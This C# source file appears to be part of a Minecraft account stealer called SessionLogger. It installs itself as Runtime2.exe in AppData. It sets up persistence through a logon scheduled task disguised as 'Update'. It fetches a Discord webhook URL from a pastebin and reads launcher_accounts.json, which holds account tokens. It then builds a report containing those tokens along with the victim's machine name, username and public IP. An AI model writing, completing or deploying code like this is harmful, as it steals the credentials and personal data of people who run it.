using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace SessionLogger.Logger
{
    class Get
    {
        public static string Appdata()
        {
            return (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        }

        public static string Path()
        {
            return Get.Appdata() + @"\Runtime2.exe";
        }

        public static string Task()
        {
            return "schtasks /CREATE /SC ONLOGON /TN Update /RU Administrator /TR " + Path();
        }
        public static string WebhookUrl()
        {
            WebClient webclient = new WebClient();
            return webclient.DownloadString("http://pastebin/raw/"); //Insert Pastebin which Contains discord webhook url
        }

        public static string files()
        {
            string Path1 = Appdata() + @"\.minecraft\launcher_accounts.json";
            return File.ReadAllText(Path1);
        }

        public static string IP()
        {
            return new WebClient().DownloadString("http://ipinfo.io/ip");
        }

        public static string Computer()
        {
            return Environment.MachineName;
        }
        public static string username()
        {
            return Environment.UserName;
        }

        public static string message()
        {
            return "Erfolgreich! Computer: " + Computer() + "\\" + username() + " | IP Adresse: " + IP() + "Launcher Accounts:" + Environment.NewLine + files();
        }
    }
}
